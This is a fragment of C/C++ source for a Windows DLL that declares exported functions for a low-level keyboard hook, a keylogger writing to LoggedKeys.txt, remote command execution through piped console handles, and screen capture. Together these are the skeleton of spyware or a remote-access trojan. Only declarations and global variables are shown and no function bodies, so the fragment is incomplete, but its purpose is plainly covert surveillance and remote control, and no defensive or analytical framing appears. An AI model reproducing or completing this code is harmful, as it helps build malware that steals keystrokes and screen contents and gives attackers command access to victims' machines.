#include <string.h>
#include<stdio.h>
#include <stdlib.h>
#include <mbstring.h>
#include <windows.h>
#include<iostream>
#include<fstream>
#include <process.h>
#include <sstream>

extern "C"    __declspec(dllexport) void setHook(); 
extern "C"    __declspec(dllexport) void unsetHook(); 
extern "C"    __declspec(dllexport) void killCmd(); 
extern "C"  __declspec(dllexport) LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam);
extern "C"  __declspec(dllexport) void launchCmd();
//extern "C"  __declspec(dllexport) char* cmdExec(char* cmd);
extern "C"  __declspec(dllexport) void cmdExec(char* cmd);
extern "C"    __declspec(dllexport) void captureAnImage(); 


//Keylogger
FILE* output = NULL;
const char path[] = ".\\LoggedKeys.txt";
HINSTANCE globalInstance = NULL; //dll instance obtained when dll main is called.
HHOOK keyLoggerHook = NULL;

//Console pipe references: two pipes: Client->write->Console and Console->write->Client
FILE* consoleOutput = NULL;
const char consoleOutputPath[] = ".\\cmdOut.txt";
char* currentDir = NULL;
PROCESS_INFORMATION procInfo;
//HANDLE childWriteEnd= NULL; 
HANDLE childReadEnd = NULL;
HANDLE parentWriteEnd = NULL;
//HANDLE parentReadEnd = NULL;


